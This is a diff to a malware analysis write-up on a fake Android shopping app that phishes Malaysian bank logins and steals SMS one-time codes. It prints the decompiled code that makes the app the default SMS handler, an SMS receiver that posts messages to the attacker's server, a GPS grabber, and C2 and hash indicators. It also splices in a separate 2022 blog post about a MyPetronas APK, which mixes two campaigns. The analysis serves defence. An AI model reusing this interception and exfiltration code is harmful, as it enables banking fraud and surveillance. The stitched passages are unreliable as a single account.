@@ -127,58 +127,353 @@ Clicking on the Google Play icon will automatically download the application to 
 Upon downloading the application, victims will install the application, and... all the SMS will be stolen for the sake of TAC code and they might be one of the victims of banking credential phishing.
 
 ## Application behavior and interface
+
+In order to analyze the functionality of the malicious app, analyst will need to explore its interface and various features, such as adding items to a shopping cart or creating an account. This can be done by manually interacting with the app and observing its behavior, or by using Android emulator. By understanding the different components and functionality of the app, the analyst can better understand its purpose and potential impact on the device and user. It is important for the analyst to be thorough in their analysis in order to identify any potential malicious behavior or vulnerabilities that may be present in the app.
+
+So, upon opening the app, victim will see a dialog box asking for SMS permission and default SMS manager.
+
 ![Snipaste_2022-12-23_20-53-39-removebg-preview](https://user-images.githubusercontent.com/56353946/209339579-b9f59871-5b99-4cda-a330-e6a855bdd211.png)
-![Snipaste_2022-12-23_20-55-32-removebg-preview](https://user-images.githubusercontent.com/56353946/209341211-2b8b9337-f38e-4eee-acc0-f3ef8deeb2a1.png)
 ![Snipaste_2022-12-23_20-55-41-removebg-preview](https://user-images.githubusercontent.com/56353946/209341216-00240392-318a-4bac-be41-dc908cc9bda0.png)
+
+```
+public void requestPermission(){
+       if (Build$VERSION.SDK_INT >= 23) {
+          String[] stringArray = new String[]{"android.permission.READ_SMS","android.permission.BROADCAST_SMS","android.permission.RECEIVE_SMS","android.permission.SEND_SMS","android.permission.RECEIVE_MMS","android.permission.RECEIVE_WAP_PUSH"};
+          SmsPermissionService.app.requestPermissions(stringArray, 101);
+       }
+       Intent intent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
+       intent.putExtra("package", SmsPermissionService.app.getPackageName());
+       SmsPermissionService.app.startActivity(intent);
+       return;
+    }
+```
+
+This code defines an requestPermission method that requests several SMS-related permissions from the user if the device is running Android 6.0 (API level 23) or higher. The permissions being requested are:
+
+- `android.permission.READ_SMS`: Allows an application to read SMS messages.
+- `android.permission.BROADCAST_SMS`: Allows an application to broadcast SMS messages.
+- `android.permission.RECEIVE_SMS`: Allows an application to receive SMS messages.
+- `android.permission.SEND_SMS`: Allows an application to send SMS messages.
+- `android.permission.RECEIVE_MMS`: Allows an application to receive MMS messages.
+- android.permission.RECEIVE_WAP_PUSH`: Allows an application to receive WAP push messages.
+
+These permissions are requested using the requestPermissions method of the Activity class, which displays a system dialog to the user asking for permission. The requestPermissions method takes two arguments: an array of strings representing the permissions being requested, and an integer request code that is used to identify the request when the result is received in the onRequestPermissionsResult method.
+
+The code also starts an activity to change the default SMS app to the current app by creating an Intent object with the action "android.provider.Telephony.ACTION_CHANGE_DEFAULT" and setting the package name of the current app as an extra. The activity is started using the startActivity method of the Activity class.
+
+Here some of the application during my testing of the app such as viewing items/services, booking items/services, adding items/services to a shopping cart, and checkout.
+
 ![Snipaste_2022-12-23_20-55-50-removebg-preview](https://user-images.githubusercontent.com/56353946/209341218-3910f52d-de6c-4100-b6e1-6c07470f98ee.png)
+
 ![Snipaste_2022-12-23_20-56-34-removebg-preview](https://user-images.githubusercontent.com/56353946/209341219-88303f48-b1b7-497b-b805-25f2b01b7b40.png)
+
 ![Snipaste_2022-12-23_20-56-46-removebg-preview](https://user-images.githubusercontent.com/56353946/209341221-65413276-36df-468b-9ff6-b4571c2d859a.png)
+
 ![Snipaste_2022-12-23_20-56-57-removebg-preview](https://user-images.githubusercontent.com/56353946/209341223-bccc5e82-819e-4c56-854c-8d1a2732f10b.png)
+
 ![Snipaste_2022-12-23_20-57-08-removebg-preview](https://user-images.githubusercontent.com/56353946/209341226-90d3bb9e-dd37-419b-abc6-4e80da8348be.png)
 
 
 ## Fake payment gateway for phishing
+
+Upon checkout the items, the app will navigate to fake payment gateaway for the payment options.
+
 ![Snipaste_2022-12-23_20-57-56-removebg-preview](https://user-images.githubusercontent.com/56353946/209341229-4f26da73-b2ea-48fc-9dcd-d6b123945be7.png)
+
+
+September 15, 2022
+SCAM ANDROID APP STEALS BANK CREDENTIALS AND SMS: MYPETRONAS APK
+This post was authored by Fareed.
+
+This blog post is intended to give a better overall picture of a malicious Android app campaign attack that believes to be targeted at Malaysians. The threat actor set up several modus operandi from Maid clean services application, toward island travel based app, and now they're using Petronas as their new theme.
+
+This blog post might useful for security engineers, Android researchers, and security analysts to catch up with current cybersecurity issues specifically mobile malware threats and Malaysia cyber security news. By the end of this blog post, readers will understand the inner working of this recent Android malware attack that happened to the compromised user. Furthermore, security analysts can collect the given IOCs extracted from the malware to check whether the environment of your organization or any contact of you has been compromised or not.
+
+Non-technical Executive Summary
+For non-technical background, this is an Android malicious application analysis that was conducted and investigated by the Netbytesec team to understand the behavior of the malicious Android application in a details manner so that we can verify how the scammed victims were being compromised or we can call it "hacked" by the scammer using this Android application installed in victim's phone. The application will phish the user to enter their bank credential in the fake payment page of FPX and credit card and also steal all victims’ SMS content. The impact of this application can expose the information of victims’ banking information to the scammer/hacker and then, the attacker might make the illegal bank transaction by leveraging the SMS stealer as an OTP number is needed to make the bank transaction.
+Executive Summary
+The Netbytesec (NBS) team has conducted an Android malware analysis on a lure Android Package Kit (APK) sample associated with Petronas as contained in the application's name and theme. The malicious Android application can be downloaded from a landing page set up by the threat actor on the internet while the campaign is going on. While using the eCommerce-based application, the victims need to make the payment of their shopping cart using a fake FPX page and fake Credit Card payment page in the application like the common banking credential stealer application targeting Malaysian banks. On top of that, after the malicious APK is installed on the victim’s Android phone, the malicious APK will steal all incoming SMS from the victim. The impact of such phishing methods and SMS stealers of this Android application can lead to the scammer could use the information to perform illegal bank transactions as they have got all important information to retrieve their goals including online banking credentials, bank card information, and SMS records for stealing the OTP code. NBS threat analysts also suspect that the actor behind this MyPetronas application is the same as malicious Cleaning Services Malaysia, Maid4u, KleanHouz, Ikea and Travel scam applications as we found the same pattern of decompiled code of the APK, webview and API server URLs path of the scammer.
+
+
+Figure 1: MyPetronas malicious APK
+Graph flow of the malicious Android Application
+
+Figure 2: Graph flow of the malware
+
+Technical Analysis
+APK Metadata information
+Application name: MyPetronas
+Package Name: com.app.homecleaning
+MD5 hash: f7d4a2b5fdb45c258fccd3059d12fee9 
+Dangerous permission: android.permission.READ_SMS
+
+
+Figure 3: Metadata of the application
+
+From the package name, we can get the clue that the threat actor of this malicious bank stealer application is the same as the other home cleaning application we've heard in the news that also targets Malaysian. The threat actor might use the same template of the Android source code and forgot to change the package name.
+Landing page overview
+The application's APK file is available to be downloaded at the landing page that has been set up by the threat actor at pt-gift.store. Based on the landing page UI, the scammer uses the Petronas theme to lure customers to download and install the malicious application if the customer wanted to book the package of Car Service package.
+
+
+Figure 4:  Landing page pt-gift.store.
+
+Application behavior and interface
+Upon opening the application for the first time, the application will ask the user to set the malicious MyPetronas application as the default SMS app in order for the application to silently gets access to the SMS content.
+
+
+Figure 5: Set the application as default Message app
+
+The behavior of this can be seen in the java decompile code of the APK in the MainActivity class at method OnCreate. 
+
+
+Figure 6: Code to set the application as default SMS app
+
+If user don't set the application as the default SMS app, the application will not proceed to open the main interface and exit the application right away.
+
+Upon entering the main interface of the application, the application will show the list of the products of Petronas engine oil with a price tag which can be seen in the menu "Shop". The user needs to choose their interested Petronas engine oil in order to book the car service package.
+
+
+Figure 7: Shop menu contains list of products
+
+Upon clicking on one of the items, the application will be brought to the description page, and then proceed to book the service by clicking the "BOOK NOW" button. 
+
+
+Figure 8: Product description
+
+In the booking chart, the user will then go to the checkout page to confirm the booking by filling in the personal information such as Name, IC, phone number, address, and booking date. It also appeared that users have two options for payment methods which are FPX payment and Credit card. Once victims fill out the form and choose the payment method, the victims will be served with the fake FPX page or fake iPay88 credit card page.
+
+
+Figure 9: User form and online payment option to confirm booking
+
+Confirming the booking will make all the information will be POST to the attacker API web server served at hxxps://lapks[.]online/skyblue_888a/api/api.php?post_order. The figure below shows the filled data in the user form sent to the API server using the POST method.
+
+
+Figure 10: Intercept POST request of the data
+
+After the data successfully send to the API server, the application will redirect the user to the payment options page, which is either the FPX page or the iPay88 credit card payment page.
+Fake payment gateway
+Once the user filled the form and submits the data, the application will load an HTML file located in the malicious application asset files. In the figure below, the application load a local HTML file into the webview instead of using a remote web page served on the internet. 
+
+
+Figure 11: Load FPX.html in webview
+
+The HTML code web page of the FPX payment is embedded in the resources file under the assets folder bundled in the application. The figure below shows the FPX.html in the assets folder which is being used for the fake FPX page. Each of the targeted banks has its own assets file such as "AFFIN_files" containing images, CSS files, or HTML files that are needed for the page to mimic a legit the Affin bank's login page.
+
+
+Figure 12: FPX.html code
+
+Here in the figure below, is how the FPX payment gateway page looks like. Victims will be phished by this look-legit webpage and proceed to choose their bank to make the payment.
+
+
+Figure 13: Fake FPX webpage
+
+The figure below is an example of the fake Maybank2u login page used to lure victims specifically to scam and steal online banking credentials.
+
+
+Figure 14: Fake Maybank2u webpage
+
+On the next page for the password insertion, a user should aware that the page does not have the security image like the original of Maybank2u. The fake FPX page shows the entered username instead of the security image.
+
+
+Figure 15: User password form
+
+Soon after victims click the login button, both the username and password of the victims will be sent to the API server via the POST method containing the username, password, bank name, agent id, sid, and app name which can be seen in the code in a Javascript file named post.js that will be call by the HTML when the victims clicking the login button.
+
+
+Figure 16: JS file used for post data of online bank credential
+
+In the figure below shows the request of the network activity happened when the button login is clicked using a dummy credential.
+
+
+Figure 17: Intercepted request
+
+This is a critical part of the communication toward the API server (apart from the SMS stealer which will be mention in the next section) where the scammer retrieves and steals the credential of Malaysian's online banking accounts.
+
+The list of bank include:
+1. Maybank
+2. Affin Bank
+3. Public Bank
+4. CIMB
+5. BSN
+6. RHB
+7. UOB
+8. Ambank
+9. Bank Islam
+10. Hong Leong Bank
+11. Bank Muamalat
+
 ![Snipaste_2022-12-23_20-58-18-removebg-preview](https://user-images.githubusercontent.com/56353946/209341232-e782d486-3230-4430-a083-c469aed60dd2.png)
 ![Snipaste_2022-12-23_20-58-26-removebg-preview](https://user-images.githubusercontent.com/56353946/209341234-691f0e11-26f8-4231-8c62-973507ca0cea.png)
 ![Snipaste_2022-12-23_20-58-48-removebg-preview](https://user-images.githubusercontent.com/56353946/209341201-c225d807-49dc-49ea-a31e-bb8a6144dfce.png)
 ![Snipaste_2022-12-23_20-59-25-removebg-preview (1)](https://user-images.githubusercontent.com/56353946/209341207-2b15dbc4-8c6c-4d5d-83b9-051cf4531ee0.png)
 ![Snipaste_2022-12-23_20-59-57-removebg-preview](https://user-images.githubusercontent.com/56353946/209341208-ad263834-b79a-4fc7-a86f-5521a7ae04fa.png)
 
-## SMS stealer for TAC code
+## SMS stealer
 
+For SMS stealer behavior, the malicious application statically declares a broadcast receiver of BROADCAST_SMS in AndroidManifest file. The APK uses the broadcast receiver to listen for any incoming message and send the incoming SMS data to the attacker API server. Intently to get TAC code of the banking transaction for the illegal transaction.
+
+```
+<receiver android:name="com.service.sms.SmsReceiver" android:permission="android.permission.BROADCAST_SMS" android:enabled="true" android:exported="true" android:priority="9999999" android:stopWithTask="false">
+            <intent-filter android:priority="9999999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.service.sms.MainSmsActivity" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.SEND"/>
+                <action android:name="android.intent.action.SENDTO"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <data android:scheme="sms"/>
+                <data android:scheme="smsto"/>
+                <data android:scheme="mms"/>
+                <data android:scheme="mmsto"/>
+            </intent-filter>
+            <meta-data android:name="android.app.lib_name" android:value=""/>
+        </activity>
+```
+
+```
+public class SmsReceiver extends BroadcastReceiver {
+    private static final String TAG = "SmsReceiver";
+
+    @Override // android.content.BroadcastReceiver
+    public void onReceive(Context context, Intent intent) {
+        SmsMessage createFromPdu;
+        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
+            Bundle extras = intent.getExtras();
+            Object[] objArr = (Object[]) extras.get("pdus");
+            int length = objArr.length;
+            int i = 0;
+            String str = "";
+            String str2 = str;
+            while (i < length) {
+                Object obj = objArr[i];
+                if (Build.VERSION.SDK_INT >= 23) {
+                    createFromPdu = SmsMessage.createFromPdu((byte[]) obj, extras.getString(AbsoluteConst.JSON_KEY_FORMAT));
+                } else {
+                    createFromPdu = SmsMessage.createFromPdu((byte[]) obj);
+                }
+                str2 = str2 + createFromPdu.getMessageBody();
+                i++;
+                str = createFromPdu.getOriginatingAddress();
+            }
+            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
+            SmsPush smsPush = new SmsPush();
+            smsPush.setSender(str);
+            smsPush.setBody(str2);
+            smsPush.setDeviceId(Settings.Secure.getString(context.getContentResolver(), "android_id"));
+            smsPush.setInterceptedTime(simpleDateFormat.format(new Date()));
+            try {
+                SmsPushRequest smsPushRequest = (SmsPushRequest) ThreadUtil.executeRunnable(new SmsPushRequest(smsPush));
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+            abortBroadcast();
+        }
+    }
+}
+```
+
+This Java code defines a class `SmsReceiver` that extends the `BroadcastReceiver` class. `BroadcastReceiver` is a class in Android that allows an app to register to receive system-wide broadcasts, such as an incoming SMS message. The `SmsReceiver` class has a default constructor and an onReceive method, which is called when the app receives a broadcast.
+
+The `onReceive` method takes two arguments: a `Context` object and an `Intent` object. The `Intent` object contains information about the broadcast, including the action that triggered it.
+
+The onReceive method first checks if the action in the Intent object is "android.provider.Telephony.SMS_RECEIVED", which indicates that an SMS message has been received. If it is, the method retrieves the extras in the Intent object and gets the "pdus" (protocol data units) from the extras. It then iterates through the array of PDUs, creating an `SmsMessage` object for each one using the `createFromPdu` method. It concatenates the message bodies of all the SmsMessage objects into a single string, and stores the originating address of the first SmsMessage object.
+
+Next, the method creates a new `SmsPush` object and sets its sender, body, and deviceId fields using the values it retrieved from the SMS message. It also sets the `interceptedTime` field to the current date and time using a `SimpleDateFormat` object. Finally, it creates a new `SmsPushRequest` object with the `SmsPush` object as an argument and executes it using the `executeRunnable` method from the `ThreadUtil` class.
+
+```
+package com.service.sms.common.constants;
+
+/* loaded from: classes2.dex */
+public class UrlConstant {
+    public static final String ACTIVE_PUSH = "https://sg1.mall-base-app.com/app/api/action/devideActivePushAction/";
+    public static final String DEFAULT_SMS_PUSH = "https://sg1.mall-base-app.com/app/api/action/defaultSmsPushAction/";
+    public static final String PREFIX = "/app/api/action/";
+    public static final String SMS_PERMISSION_PUSH = "https://sg1.mall-base-app.com/app/api/action/smsPermissionPushAction/";
+    public static final String SMS_PUSH = "https://sg1.mall-base-app.com/app/api/action/smsMessagePushAction/";
+}
+```
+
+After getting the SMS data, the app will send the data to the `UrlConstant.DEFAULT_SMS_PUSH URL` using an HTTP POST request and processes the response from the server to determine if the request was successful.
+
+## Track GPS location
+```
+JSONObject jSONObject = new JSONObject();
+        LocationManager locationManager = (LocationManager) context.getSystemService("location");
+        if (locationManager != null) {
+            try {
+                Method declaredMethod = locationManager.getClass().getDeclaredMethod("getLastKnownLocation", String.class);
+                declaredMethod.setAccessible(true);
+                Location location = (Location) declaredMethod.invoke(locationManager, "gps");
+                if (location == null && (location = (Location) declaredMethod.invoke(locationManager, "network")) == null) {
+                    location = (Location) declaredMethod.invoke(locationManager, "passive");
+                }
+                if (location != null) {
+                    Class<?> cls = Class.forName("android.location.Location");
+                    Method method = cls.getMethod("getLongitude", new Class[0]);
+                    Method method2 = cls.getMethod("getLatitude", new Class[0]);
+                    Method method3 = cls.getMethod("getAccuracy", new Class[0]);
+                    Method method4 = cls.getMethod("getTime", new Class[0]);
+                    method.setAccessible(true);
+                    jSONObject.put("lon", String.valueOf(method.invoke(location, new Object[0])));
+                    method2.setAccessible(true);
+                    jSONObject.put("lat", String.valueOf(method2.invoke(location, new Object[0])));
+                    method3.setAccessible(true);
+                    jSONObject.put("accuracy", String.valueOf(method3.invoke(location, new Object[0])));
+                    method4.setAccessible(true);
+                    jSONObject.put("ts", String.valueOf(method4.invoke(location, new Object[0])));
+                }
+            } catch (Exception unused) {
+            }
+        }
+        a = jSONObject;
+        b = true;
+        return jSONObject;
+```
+
+This method tries to retrieve the last known location from the device and return it as a JSONObject.
+
+The method first checks whether the passed Context object is `null` and returns an empty `JSONObject` if it is. Then, it checks whether the app has the permissions `android.permission.ACCESS_FINE_LOCATION` and `android.permission.ACCESS_COARSE_LOCATION`, and returns an empty `JSONObject` if it doesn't have either of these permissions.
+
+If these checks pass, the method creates a new `JSONObject` and retrieves the `LocationManager` service from the system using the context object's `getSystemService` method. It then tries to retrieve the last known location using reflection. It does this by calling the `getDeclaredMethod` method on the `locationManager` object to get a Method object for the `getLastKnownLocation` method, which it then sets to be accessible using `setAccessible(true)`. It then invokes the method using invoke and passes it the argument "gps". If this returns null, the method tries again with the arguments "network" and "passive".
+
+If a location is found, the method uses reflection to get the longitude, latitude, accuracy, and time of the location. It then adds the values returned by these methods to the JSONObject as key-value pairs.
+
+Finally, the method sets the static JSONObject a to the JSONObject it created and sets the static boolean variable b to true, and returns the JSONObject.
 
 # Summary
 The blog discusses the use of a lure application by a scammer to steal sensitive information from users. The lure application serves as a decoy, tricking users into providing their SMS data and online banking credentials, as well as credit card information. Once the scammer has obtained this information, it is submitted to the attacker's Command and Control (C2) server using an API located at the domain sg1[.]mall-base-app[.]com. The attacker can then use the stolen information, such as banking credentials and credit card information, to obtain the Transaction Authorization Code (TAC) for illegal transactions. Essentially, the scammer is using the lure application to phish for sensitive information and use it for fraudulent purposes.
 
 # Indicator of Compromises
-C2 server:
-```
-https://sg1.mall-base-app.com
-```
+| C2 Server |
+| --- |
+| https://sg1.mall-base-app.com | 
 
-URLs:
-```
-https://sg1.mall-base-app.com/app/api/action/defaultSmsPushAction/
-https://sg1.mall-base-app.com/app/api/action/devideActivePushAction/
-https://sg1.mall-base-app.com/app/api/action/smsMessagePushAction/
-https://sg1.mall-base-app.com/app/api/action/smsPermissionPushAction/
-https://u138-paymobile7731.pay-director.com/maybank/pay.html
-```
+| URLs |
+| --- |
+| https://sg1.mall-base-app.com/app/api/action/defaultSmsPushAction/ |
+| https:/sg1.mall-base-app.com/app/api/action/devideActivePushAction/ |
+| https://sg1.mall-base-app.com/app/api/action/smsMessagePushAction/ |
+| https://sg1.mall-base-app.com/app/api/action/smsPermissionPushAction/ |
+| https://u138-paymobile7731.pay-director.com/maybank/pay.html |
 
-Hashes:
-```
-ccb0e8380057a4c406996d5102079a4b  Luxury.apk
-e062d108c93082fb9f47c3f2249d19c5  TechDigital.apk
-e71f6e4629fb88ab18e52a2591b14fa8  best-cleaning.apk
-7f0e204375caddb08d4c3f9937fa8304  bubble-clean.apk
-1b7df305308e4177ae2f078be13c3de9  clean-house.apk
-2b425dd477fca2932dfab2d5159f611d  dog-salon.apk
-a56a386b76841bd0aa10654e8d7f4efc  dogs-clubs.apk
-1abf5db7726c4e6e9a3a6ce6cdd313af  double-clean.apk
-f8de585ec8d75b6aae0f41ddf2dc03d8  grooming-time.apk
-5ca6c25f1b2d8e4ca5987e68616247d7  pinkycat.apk
-23f449dbfc6b9ccae1d20d318672e6d4  speedmart.apk
-1030f97b9ad1addf85b980f576b648a3  we-clean.apk
-1030f97b9ad1addf85b980f576b648a3  we-clean.apk
-```
+| MD5 Hash | Filename |
+| --- | --- |
+| ccb0e8380057a4c406996d5102079a4b | Luxury.apk |
+| e062d108c93082fb9f47c3f2249d19c5 | TechDigital.apk |
+| e71f6e4629fb88ab18e52a2591b14fa8 | best-cleaning.apk |
+| 7f0e204375caddb08d4c3f9937fa8304 | bubble-clean.apk |
+| 1b7df305308e4177ae2f078be13c3de9 | clean-house.apk |
+| 2b425dd477fca2932dfab2d5159f611d | dog-salon.apk |
+| a56a386b76841bd0aa10654e8d7f4efc | dogs-clubs.apk |
+| 1abf5db7726c4e6e9a3a6ce6cdd313af | double-clean.apk |
+| f8de585ec8d75b6aae0f41ddf2dc03d8 | grooming-time.apk |
+| 5ca6c25f1b2d8e4ca5987e68616247d7 | pinkycat.apk |
+| 23f449dbfc6b9ccae1d20d318672e6d4 | speedmart.apk |
+| 1030f97b9ad1addf85b980f576b648a3 | we-clean.apk |
+| 1030f97b9ad1addf85b980f576b648a3 | we-clean.apk |
+
